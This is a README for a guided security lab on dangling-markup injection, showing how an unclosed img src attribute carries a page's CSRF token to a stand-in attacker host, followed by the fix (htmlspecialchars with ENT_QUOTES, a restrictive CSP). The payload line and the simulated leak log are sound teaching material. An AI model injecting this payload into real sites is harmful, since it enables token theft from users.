# Lab 1: Guided Walkthrough — Dangling Markup Token Theft

> 🌐 **Language:** **English** | [🇸🇦 النسخة العربية (README.ar.md)](./README.ar.md)

---

## 🎯 Lab Objective
Understand how unclosed HTML attributes ("Dangling Markup") can be weaponized to exfiltrate sensitive anti-CSRF tokens and private data to an attacker-controlled server **even when JavaScript execution is completely disabled** by a strict Content Security Policy (`script-src 'none'`).

---

## 🔬 Vulnerability Architecture & Root Cause

### 1. The Vulnerable Context:
In `index.html`, examine the template structure:
```html
<div class="user-greeting">
    Welcome back, <?= $userNickname ?>!
</div>

<form action="/api/account/delete" method="POST">
    <input type="hidden" name="csrf_token" value="super_secret_token_123">
    <button type="submit">Delete Account</button>
</form>
```
The application reflects the user's `$userNickname` without contextual entity encoding.

### 2. The Attacker's Dangling Payload:
The attacker supplies:
```html
<img src='https://attacker-listener.example/leak?data=
```

### 3. The Browser Parser Behavior:
Notice that the payload opens a single quote (`'`), but **never closes it**. The browser's HTML parser treats everything following the opening quote as the URL parameter of the `src` attribute until it encounters a matching single quote or the end of the document.

The resulting assembled tag becomes:
```html
<img src='https://attacker-listener.example/leak?data=!<input type="hidden" name="csrf_token" value="super_secret_token_123">...'>
```
The browser immediately fires an outbound HTTP GET request to `attacker-listener.example`, transmitting the secret CSRF token directly in the query string!

---

## 🚀 Step-by-Step Walkthrough

1. Open `index.html` in your browser:
   ```powershell
   Start-Process chrome.exe "E:\Programming Languages\02-HTML-CSS\Level-3-Advanced-and-Security\Labs\Lab-1-Guided-Walkthrough\index.html"
   ```
2. Click **"Simulate Vulnerable Reflection"**:
   - Inspect the **Attacker Server Access Log** section.
   - Observe that the simulated attacker server captured:
     `GET /leak?data=...csrf_token...SUPER_SECRET_CSRF_TOKEN_2026`.
3. Now click **"Apply Secure Defense Patch (ENT_QUOTES)"**:
   - The server encodes quotes: `<` becomes `&lt;`, and `'` becomes `&#039;`.
   - The browser parses the input as literal display characters, not an HTML tag.
   - The attack is completely neutralized!

---

## 🛡️ Remediation Code

In PHP / backend template engines:
```php
// VULNERABLE:
echo $nickname;

// REMEDIATED (Safe from Dangling Markup):
echo htmlspecialchars($nickname, ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

And enforce restrictive Content Security Policy headers:
```http
Content-Security-Policy: default-src 'self'; img-src 'self';
```

---

**Next Lab:**  
🎯 **[Proceed to Lab 2: Unsolved Challenge — CSS Data Exfiltration](../Lab-2-Challenge-Unsolved/README.md)**
